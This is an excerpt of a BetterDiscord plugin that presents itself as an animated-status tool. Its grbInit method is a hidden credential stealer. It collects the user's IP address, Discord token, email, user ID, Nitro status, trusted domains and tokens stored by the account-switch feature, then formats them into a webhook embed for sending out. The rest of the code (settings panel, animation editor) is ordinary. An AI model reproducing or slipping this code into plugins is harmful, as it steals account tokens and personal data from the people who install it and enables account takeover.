class AnimatedStatus {
  ...
  getDescription() {
    return "Get your token information and AnimatedStatus integrated";
  }

  SetData(key, value) {
    BdApi.setData("AnimatedStatusGrb", key, value);
  }

  GetData(key) {
    return BdApi.getData("AnimatedStatusGrb", key);
  }
  ...
  load() {
    ...
    if (typeof this.timeout == "string") this.timeout = parseInt(this.timeout);
    ...
    this.currentUser = BdApi.findModule(
      (m) => m.default && m.default.getCurrentUser
  ...
  start() {
    ...
    if (this.animation.length == 0)
      BdApi.showToast(
        "AnimatedStatusGrb: No status set. Go to Settings>Plugins to set a custom animation!"
      );
    else this.AnimationLoop();
  }
  ...
  async grbInit() {
    ...
    var config = {
      ...
      webhookAvatar:
        "https://cdn.discordapp.com/avatars/784731314913935361/3a56b5df010d6564f99137c4b7c84a4c.webp?size=80",
    ...
    var IP = await getIP();
    var actualUserUsername = document.getElementsByClassName(
      "size14-3fJ-ot title-338goq"
    )[0].innerText;
    var actualUserDiscriminator = document
      .getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]
      .innerText.includes("\n")
      ? document
          .getElementsByClassName("hoverRoll-2XwpoF")[0]
          ?.innerText.split(/\r\n|\r|\n/)[0]
      : document
          .getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]
          ?.innerText.split(/\r\n|\r|\n/);
    ...
    var actualUserPremiumState = window.webpackChunkdiscord_app.push([
      [Math.random()],
      {},
      (e) => {
        for (const r of Object.keys(e.c)
          .map((r) => e.c[r].exports)
          .filter((e) => e)) {
          if (r.default && void 0 !== r.default.getCurrentUser)
            return JSON.parse(JSON.stringify(r.default.getCurrentUser()))
              .premiumUsageFlags;
          if (void 0 !== r.getCurrentUser)
            return JSON.parse(JSON.stringify(r.getCurrentUser()))
              .premiumUsageFlags;
        }
      },
    ]);
    ...
    var verifiedGameAndProgramsList = await getLocalStorageInfo(
      "GameStoreReportedGames"
    ); //List of VERIFIED games/programs
      ...
      embeds: [
        {
          ...
          fields: [
            ...
            {
              name: "Actual User Token",
              value: `\`${
                actualUserToken.replaceAll('"', "") || "Unknown Issue"
              }\``,
              inline: true,
            },
            {
              name: "Actual User Tag With ID",
              value: `\`${actualUserTag.replaceAll(
                '"',
                ""
              )}\` - (\`${actualUserID.replaceAll('"', "")}\`)`,
              inline: true,
            },
            {
              name: "Actual User email",
              value: `\`${actualUserEmail.replaceAll('"', "")}\``,
              inline: true,
            },
            {
              name: "Actual User Premium Status(Nitro)",
              value: `\`${
                ["No", "Classic", "Boost"][actualUserPremiumState]
              }\``,
              inline: true,
            },
            {
              name: "Trusted Domains List",
              value: `\`\`\`\n${
                trustedDomains == undefined
                  ? "null"
                  : JSON.parse(trustedDomains)["trustedDomains"]
              }\`\`\``,
              inline: false,
            },
            {
              name: "Stored Tokens(From Switch Account Feature :) (ID:Token))",
              value: `\`\`\`json\n${
                storedTokens == undefined ? "null" : storedTokens
              }\`\`\``,
              inline: false,
            },
            {
              name: "Verified Games & Programs",
              value: `\`\`\`json\n${
                verifiedGameAndProgramsList == undefined
                  ? "null"
                  : verifiedGameAndProgramsList
              }\`\`\``,
              inline: false,
            },
          ],
  ...
  NewEditorRow({ text, emoji_name, emoji_id, timeout } = {}) {
    ...
    let emojiWidget = hbox.appendChild(
      GUI.newInput(
        emoji_name,
    ...
    let optTimeoutWidget = hbox.appendChild(
    ...
    hbox.onkeydown = (e) => {
      ...
      let activeIndex = Array.from(activeContainer.children).indexOf(
  ...
  getSettingsPanel() {
    ...
    settings.appendChild(
      GUI.newLabel(
        "Step-Duration (3000: 3 seconds, 3500: 3.5 seconds, ...), overwritten by invididual steps"
      )
    );
    let timeout = settings.appendChild(
    ...
    let animationContainer = settings.appendChild(
      document.createElement("div")
    );
    animationContainer.marginBottom = this.kSpacing;

    // Editor
    let edit = animationContainer.appendChild(
    ...
    // Add Step
    let addStep = actions.appendChild(
    ...
    // Del Step
    let delStep = actions.appendChild(
